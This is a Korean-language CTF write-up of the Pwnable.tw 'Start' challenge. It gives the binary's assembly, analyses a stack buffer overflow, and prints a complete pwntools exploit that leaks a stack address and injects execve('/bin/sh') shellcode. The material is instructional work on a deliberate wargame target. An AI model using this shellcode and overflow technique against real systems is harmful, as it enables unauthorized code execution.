---
title: "Pwnable.tw: Start"
date: 2019-01-01
description: "Pwnable.tw Start 챌린지: NX 미적용 최소 32비트 Linux 바이너리에서 스택 기반 버퍼 오버플로우를 통한 셸코드 인젝션"
tags: ["pwnable.tw", "pwn", "shellcode", "buffer-overflow", "32-bit"]
platform: "wargame"
category: "pwn"
difficulty: "easy"
categories: ["CTF"]
authors:
  - name: "ph4nt0m"
    link: "https://github.com/Phantomn"
    image: "https://github.com/Phantomn.png"
---

## 개요

Start는 libc 없이 순수 x86 어셈블리로 작성된 최소화된 32비트 Linux 바이너리다. 스택 보호도 없고 NX도 없다. 스택 주소를 누출한 뒤 셸코드를 주입하는 문제다.

## 소스

```asm
push    esp
push    offset _exit
xor     eax, eax
xor     ebx, ebx
xor     ecx, ecx
xor     edx, edx
push    3A465443h
push    20656874h
push    20747261h
push    74732073h
push    2774654Ch       ; "Let's start the CTF:"
mov     ecx, esp        ; addr
mov     dl, 14h         ; len = 20
mov     bl, 1           ; fd = stdout
mov     al, 4
int     80h             ; sys_write(1, esp, 20)
xor     ebx, ebx
mov     dl, 3Ch         ; len = 60
mov     al, 3
int     80h             ; sys_read(0, ecx, 60)
add     esp, 14h        ; 스택 20바이트 복원
retn
```

## 분석

이 코드의 흐름:
1. `eax`, `ebx`, `ecx`, `edx`를 0으로 초기화
2. `"Let's start the CTF:"` 문자열(5개 dword = 20바이트)을 스택에 push
3. `esp`를 `ecx`에 복사 — `sys_write`의 버퍼 주소 파라미터 — `esp` 자체는 변경하지 않음
4. `sys_write(stdout, esp, 20)` 호출로 프롬프트 출력
5. `sys_read(stdin, ecx, 60)` 호출 — 동일한 `ecx`(스택을 가리킴)에 60바이트 읽음
6. `add esp, 0x14`로 20바이트 문자열 데이터를 스택에서 제거
7. `retn` 실행 — 스택에서 다음 값을 팝해 리턴 주소로 사용

read 호출은 60바이트를 받지만 문자열 데이터는 20바이트밖에 없다. `add esp, 0x14` 이후 문자열 데이터 바로 다음 4바이트가 리턴 주소가 된다. 즉 20바이트 버퍼 + 4바이트 ret 덮어쓰기가 가능하다.

## 익스플로잇 전략

핵심 아이디어: `esp`는 `sys_write`와 `sys_read` 호출 사이에서 변하지 않는다. 출력 전에 스택에 문자열을 push할 때 현재 `esp` 값이 그대로 `ecx`에 들어간다.

`ret`를 `mov ecx, esp` 명령(`0x8048087`)으로 리다이렉트하면, 프로그램이 `sys_write(stdout, esp, 20)`를 한 번 더 실행한다. 이때 `add esp, 0x14`로 스택이 20바이트 이동했으므로, 리턴 주소 영역을 누출할 수 있다.

누출된 4바이트가 실제 스택 주소다. 여기에 `0x14`를 더하면 두 번째 페이로드에서 셸코드가 위치할 주소를 정확히 가리킨다.

## 풀이

```python
from pwn import *

p = remote("chall.pwnable.tw", 10000)
#p = process("./start")

context.arch = 'i386'

shellcode = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"

print p.recvuntil("Let's start the CTF:")

# Stage 1: ret를 0x8048087(mov ecx, esp)로 덮어 스택 주소 누출
payload = ""
payload += "A" * 20          # 문자열 버퍼 채우기
payload += p32(0x8048087)    # ret → mov ecx, esp로 복귀 → sys_write 재실행

p.send(payload)

# 두 번째 sys_write가 이동된 esp부터 20바이트 출력
leak = u32(p.recv(4))
print "leak : ", hex(leak)
p.recv()

# Stage 2: 셸코드 전송; leak+0x14(패딩 20바이트 이후)로 점프
payload2 = ""
payload2 += "\x90" * 0x14   # NOP 슬레드 / 패딩
payload2 += p32(leak + 0x14) # ret → 셸코드가 시작되는 스택 주소
payload2 += shellcode

p.send(payload2)

p.interactive()
```

## 페이로드 분석

**Stage 1**

```
[A * 20][0x8048087]
  ^           ^
  |           |
  채우기       ret → mov ecx, esp (write 재실행으로 esp 누출)
```

**Stage 2**

```
[NOP * 20][leak + 0x14][셸코드]
               ^
               ret → 셸코드 실행
```

누출된 주소는 두 번째 `sys_write` 시점의 `esp` 값이다. 각 `add esp, 0x14` 반복마다 `esp`가 `0x14`씩 이동하므로, 누출된 값에 `0x14`를 더하면 두 번째 페이로드에서 패딩 직후 — 정확히 셸코드가 시작되는 위치 — 의 주소가 된다.
